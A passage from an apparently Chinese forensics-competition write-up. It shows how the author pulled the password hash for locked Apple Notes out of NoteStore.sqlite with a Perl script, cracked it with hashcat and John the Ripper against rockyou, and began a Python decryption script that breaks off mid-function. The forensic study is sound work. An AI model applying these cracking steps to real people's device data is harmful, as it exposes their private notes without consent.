&lt;p&gt;不过下一题会给出答案&lt;/p&gt;
&lt;h2 id=&#34;38承上题上述备忘录的内容有一串数字它是什么以阿拉伯数字回答&#34;&gt;38.承上题，上述备忘录的内容有一串数字，它是什么?(以阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;上网查找破解notes密码的方法，找到了下面这篇文章：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.kaotenforensic.com/cellebrite/blog/bruteforce-securenotes-hashcat/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.kaotenforensic.com/cellebrite/blog/bruteforce-securenotes-hashcat/
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中有着这样一段话：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814181220752&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814181220752.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814181220752.png&#34; alt=&#34;image-20250814181220752&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;原来看数据库就能知道哪一个数据被加密了，看来以后得多看才是，我们导出看一眼：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814181640051&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814181640051.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814181640051.png&#34; alt=&#34;image-20250814181640051&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;果真找到了对应数据，sql查询一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ZCRYPTOITERATIONCOUNT&lt;/code&gt; 显示加密迭代次数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ZISPASSWORDPROTECTED&lt;/code&gt;=1表示有密码保护，0表示没有&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;ZTITLE1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;ZCRYPTOITERATIONCOUNT&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;ZISPASSWORDPROTECTED&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZICCLOUDSYNCINGOBJECT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZTITLE1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;Halo&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;今天&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814182234517&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814182234517.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814182234517.png&#34; alt=&#34;image-20250814182234517&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;什么，竟然这两个都真的被加密了，那谁还分得清啊！&lt;/p&gt;
&lt;p&gt;不要紧，正确答案是可以被解密出来有一串数字的，我们接着往下做&lt;/p&gt;
&lt;p&gt;notes加密的原理大概就是使用PBKDF2和SHA256算法把简单密码通过反复的哈希拉伸成一个16字节密钥，那么我们就可以想办法从数据库文件（也就是NoteStore.sqlite）里面提取出这个hash，再对它进行爆破&lt;/p&gt;
&lt;p&gt;文章里给出了提取hash的perl语言脚本，这里我们保存成iOS_notes.pl：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;strict&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;warnings&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;DBI&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;DBD::SQLite&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;die&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;usage: $0 NoteStore.sqlite\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;unless&lt;/span&gt; (&lt;span style=&#34;color:#e5c07b&#34;&gt;scalar&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;@ARGV&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;my&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$database&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;shift&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;@ARGV&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;my&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$dsn&lt;/span&gt;      &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;DBI:SQLite:dbname=$database&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;my&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$userid&lt;/span&gt;   &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;my&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;my&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$dbh&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;DBI&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;connect&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;$dsn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$userid&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$password&lt;/span&gt;, { &lt;span style=&#34;color:#e06c75&#34;&gt;RaiseError&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; }) &lt;span style=&#34;color:#56b6c2&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;die&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;DBI::&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;errstr&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;my&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$sth&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$dbh&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;prepare&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT Z_PK,ZCRYPTOITERATIONCOUNT,ZCRYPTOSALT,ZCRYPTOWRAPPEDKEY FROM ZICCLOUDSYNCINGOBJECT WHERE ZISPASSWORDPROTECTED=1&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sth&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;execute&lt;/span&gt; () &lt;span style=&#34;color:#56b6c2&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;die&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;DBI::&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;errstr&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#c678dd&#34;&gt;my&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$row&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$sth&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fetchrow_arrayref&lt;/span&gt; ())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e5c07b&#34;&gt;printf&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;\$ASN\$*%d*%d*%s*%s\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$row&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#e06c75&#34;&gt;$row&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#e5c07b&#34;&gt;unpack&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$row&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;]), &lt;span style=&#34;color:#e5c07b&#34;&gt;unpack&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$row&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;]));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sth&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;finish&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$dbh&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;disconnect&lt;/span&gt; ();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;exit&lt;/span&gt; (&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们也可以直接手动从数据库里面复制出来hash值，不过有现成的脚本不用白不用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;perl&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;iOS_notes&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;pl&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NoteStore&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;sqlite&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;hash&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而Apple Secure Notes的设计是一个账户的所有安全备忘录可以用同一个自定义密码解锁，也就是说不管我们取出来多少加密过的hash，只要破解出来一个就可以：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;head  -n &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; hash.txt &amp;gt; hash_first.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Apple Secure Notes的加密算法对应16200这个模式，我们指定然后运行，这里用的是kali自带字典：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -m &lt;span style=&#34;color:#d19a66&#34;&gt;16200&lt;/span&gt; -a &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt; hash_first.txt /usr/share/wordlists/rockyou.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然而我是在一台Kali虚拟机里操作的，虚拟机环境无法直接调用物理GPU，Hashcat只能切换到CPU模式&lt;/p&gt;
&lt;p&gt;行吧，CPU就CPU，慢点就慢点，但第二个问题出现了：Hashcat的通用CPU驱动内存分配上限很低，而&lt;code&gt;-m 16200&lt;/code&gt;恰恰要很多内存，这就导致跑不动破解的哈希算法&lt;/p&gt;
&lt;p&gt;为了解决这个问题，我折腾了很久：修复Kali的apt源、安装开源驱动、都没有用&lt;/p&gt;
&lt;p&gt;最后只能换一个工具（早该想到的）：John the Ripper，据说对CPU的支持非常出色，没有内存限制问题，而且kali也默认安装了它：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;john --wordlist&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash_first.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后运行很成功，查看破解密码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;john --show hash_first.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815120251437&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815120251437.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815120251437.png&#34; alt=&#34;image-20250815120251437&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;234567
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不过到这一步只是有密码而已，我们还需要得到内容&lt;/p&gt;
&lt;p&gt;我们还是处理NoteStore.sqlite数据库，加密数据可能在两个地方：&lt;code&gt;ZICNOTEDATA&lt;/code&gt;表的&lt;code&gt;ZDATA&lt;/code&gt;列（通常是笔记主体）或者&lt;code&gt;ZICCLOUDSYNCINGOBJECT&lt;/code&gt;表的&lt;code&gt;ZENCRYPTEDVALUESJSON&lt;/code&gt;列（通常是附件元数据等）&lt;/p&gt;
&lt;p&gt;或许最简单的方式就是手机仿真然后直接打开notes看一眼吧（我猜的），不过我并不知道如何这样做，也不知道能不能这样做，最后调教了很久的ai，处理了很久的环境问题，写出来了一个python脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sqlite3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;zlib&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;AES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Crypto.Protocol.KDF&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;PBKDF2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Crypto.Hash&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SHA256&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;cryptography.hazmat.primitives.keywrap&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;aes_key_unwrap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;cryptography.hazmat.backends&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;default_backend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;decrypt_aes_gcm&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;key&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;nonce&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;ciphertext&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;tag&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&amp;#34;AES-GCM 解密&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;cipher&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;AES&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;new&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;key&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;AES&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;MODE_GCM&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;nonce&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;nonce&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#7f848e&#34;&gt;# 关联数据为空，不传 assoc_data&lt;/span&gt;
